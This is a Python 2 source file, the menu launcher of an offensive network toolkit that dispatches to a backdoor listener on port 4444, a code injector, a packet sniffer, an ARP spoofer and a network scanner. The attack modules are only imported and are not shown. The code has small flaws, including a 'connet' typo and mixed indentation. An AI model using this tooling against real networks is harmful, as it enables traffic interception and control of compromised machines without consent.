

from termcolor import colored
from Listener import listener
from packetsniff import Sniffer
from code_injector import injector
from arpspoof import ARPSpoof
from pynput import keyboard as kb
from pynput.keyboard import Key
from netscan import NetScanner
import keyboard
import time
import re
import os
import socket
from logos import Logo


class Menu:
	"""Class to initiate which sub-program is called by checking the input"""
	def __init__(self):
		os.system('clear')
		logo = Logo()
		logo.toolkit_logo()
		# Sub programs
		action_list = ["Backdoor listener", "Code Injector","Packet Sniffer", "ARP Spoofer", "Network Scanner","Exit"]
		for i in range(0, len(action_list)):
			print(colored("[{}]".format(i+1), 'yellow') + " {}".format(action_list[i]))
			time.sleep(0.2)
			
		action = raw_input(colored("\n\n[-] ", 'magenta') + colored("Enter an action: ", 'cyan', attrs=['bold']))
		action = action.split(' ')
		self.check_input(action)

	# Get the ip address of your system
	def get_system_ip(self):
		# This method might have some issues
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.settimeout(0)
		try:
			# trying to connect to a remote server in order to get the ip address
			# of this machine
			s.connet(('10.254.254.254', 1))
			ip = s.getsockname()[0]
		except Exception:
			ip = '127.0.0.1'
		finally:
			s.close()
		return ip

	# Opening listener for the Backdoor
	def open_listener(self, ip):
		my_listener = listener(ip, 4444)
		while True:
			my_listener.run()

	# IP validation method
	def valid_ip(self, ip):
		pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
		return bool(re.match(pattern, ip))

	# Checking the input in order to call the right program
	def check_input(self, action):
		if action[0] == "1":
        		print(colored("[-] ", 'yellow') + "Press UP Arrow to set IP! Press Down Arrow to set IP manually!")
        		while True:
				if keyboard.is_pressed('up'):
					# This condition might have some problems, fixing it in the coming updates
					ip_address = self.get_system_ip()
					if self.valid_ip(ip_address):
						self.open_listener(ip_address)
					else:
						print(colored("[!] Invalid IP input.", 'red'))
						time.sleep(2)
				elif keyboard.is_pressed('down'):
					ip_address = raw_input(colored("[-]", 'blue') + " Set your IP Address: ")
					if self.valid_ip(ip_address):
						self.open_listener(ip_address)
					else:
						print(colored("[!] Invalid IP input.", 'red'))
						time.sleep(2)
						break
				
		elif action[0] == "2":
			injector()
		elif action[0] == "3":
			interface = raw_input(colored("[-]", 'blue') + " Set your interface to sniff on: ")
			keyboard.read_key()
			Sniffer(interface)
		elif action[0] == "4":
			target_ip = raw_input(colored("[?] ", 'magenta') + "Enter your target's IP Address: ")
			AP_IP = raw_input(colored("[?] ", 'magenta') + "Enter your Access Point IP Address: ")
			if self.valid_ip(target_ip) and self.valid_ip(AP_IP):
				ARPSpoof(target_ip, AP_IP)
			else:
				print(colored("[!] Invalid IP input.", 'red'))
				time.sleep(2)
		elif action[0] == "5":
			ip_range = raw_input(colored("[?] Set your IP (IP range): ", 'yellow'))
			NetScanner(ip_range)
		elif action[0] == "6":
			print(colored("\n[*] Exiting the Program.", 'red'))
			time.sleep(1)
			os.system('clear')
			exit()
		else:
			print(colored("\n[!] Action not found. Please Enter the correct number...", 'yellow', attrs=["bold"]))
			time.sleep(3)
